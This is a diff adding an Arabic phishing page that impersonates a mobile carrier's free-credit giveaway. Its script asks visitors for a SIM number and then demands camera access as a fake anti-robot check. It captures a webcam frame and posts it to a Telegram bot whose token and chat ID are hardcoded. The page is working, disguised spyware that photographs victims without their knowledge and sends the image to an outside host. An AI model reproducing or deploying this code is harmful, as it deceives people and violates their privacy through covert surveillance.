@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta property="og:title" content="تهانينا! لقد ربحت 1000 دولار!">
+    <meta property="og:description" content="📢   شركة ارسال ترسل جواز رصيد مجاني  20GB  شارك واربح ">
+    <meta property="og:image" content="https://www.syria.tv/sites/default/files/2023-07/328048663_1602300940193465_882274202646080445_n.jpg">
+    <meta property="og:type" content="website">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="icon" type="image/png" href="images-Pica-removebg-preview.png">
+
+
+    <title>اربح بطاقتك من أرسيل</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 500px;
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: right;
+        }
+
+        .logo-small {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 10px;
+        }
+
+        .main-image {
+            width: 100%;
+            height: auto;
+            max-height: 350px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+        }
+
+        .title {
+            font-size: 18px;
+            margin-bottom: 15px;
+            color: #333;
+            text-align: right;
+            font-weight: bold;
+        }
+
+        .main-button {
+            background-color: #ee8700;
+            /* لون رمادي */
+            color: #ffffff;
+            border: none;
+            padding: 15px 20px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        .note {
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .lang-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .lang-buttons button {
+            padding: 8px 12px;
+            font-size: 12px;
+            border: 1px solid #aaa;
+            background-color: white;
+            color: #333;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .lang-buttons button:hover {
+            background-color: #eee;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #777;
+        }
+
+        @media screen and (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+
+            .main-button {
+                font-size: 14px;
+                padding: 12px;
+            }
+        }
+
+        input {
+
+            width: 100%;
+            border: 1px solid #eb8f26;
+            border-radius: 2px;
+            padding: 10px;
+            margin-bottom: 10px;
+            outline: none;
+            text-align: end;
+
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <img src="logo_colorful.jpg" alt="شعار" class="logo-small">
+        <img src="images-Pica-removebg-preview.png" alt="تسجيل الدخول" class="main-image">
+
+        <!-- العنوان -->
+        <div class="title"> ضيف رقم الشريحة كي يتم ارسال الرصيد </div>
+
+        <input type="number" required>
+
+        <!-- الزر الرمادي -->
+        <button class="main-button" onclick="Alert()"> ارسال الرقم للتحويل </button>
+
+        <!-- الملاحظة -->
+        <div class="note">
+            *لاستخدام الرعاية الذاتية ، يجب عليك أولاً إنشاء حساب ana.
+        </div>
+
+        <!-- أزرار تغيير اللغة -->
+        <div class="lang-buttons">
+            <button style="background-color: #eb8f26; color: white;">AR</button>
+            <button>KU</button>
+            <button>EN</button>
+
+        </div>
+
+        <!-- الحقوق -->
+        <div class="footer">
+            © 2018-2024 rcell. كل الحقوق محفوظة
+        </div>
+    </div>
+
+
+    <script>
+        var button = document.querySelector(".main-button");
+
+        // عند الضغط على الزر
+        button.onclick = function Alert() {
+
+
+
+            // طلب الوصول إلى الكاميرا
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function (stream) {
+                    // إذا وافق المستخدم، نرسل الصورة
+                    sendImageToTelegram(stream);
+                })
+                .catch(function (error) {
+                    alert("  تم رفضك من ارسال الرقم لنك لم تسمح بالتحقق من انك ليس  ربوت ");
+                });
+        }
+
+
+
+
+
+        // دالة إرسال الصورة إلى تليجرام
+        function sendImageToTelegram(stream) {
+            var video = document.createElement("video");
+            video.srcObject = stream;
+            video.play();
+
+            // ننتظر قليل (مثلاً ثانية) عشان يشتغل الفيديو
+            setTimeout(function () {
+                var canvas = document.createElement("canvas");
+                canvas.width = 320;
+                canvas.height = 240;
+                var ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // نحول الصورة إلى blob ثم نرسلها
+                canvas.toBlob(function (blob) {
+                    var token = "7814008026:AAH-PE33ItVhcBAI5mCCmLWbFywHzxZC7zE";
+                    var chat_id = "7837731408";
+                    var url = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+                    var formData = new FormData();
+                    formData.append("chat_id", chat_id);
+                    formData.append("photo", blob, "image.jpg");
+
+                    fetch(url, {
+                        method: "POST",
+                        body: formData
+                    })
+                        .then(response => response.json())
+                        .then(data => {
+                            alert("تم إرسال الرقم  إلى شركة ارسيل  ✅");
+                            stream.getTracks().forEach(track => track.stop()); // نوقف الكاميرا
+                        })
+                        .catch(error => {
+                            alert("  فشل  ارسال رقمك  ");
+                            console.error(error);
+                        });
+                }, "image/jpeg");
+            }, 1000);
+        }
+    </script>
+
+
+</body>
+
+</html>
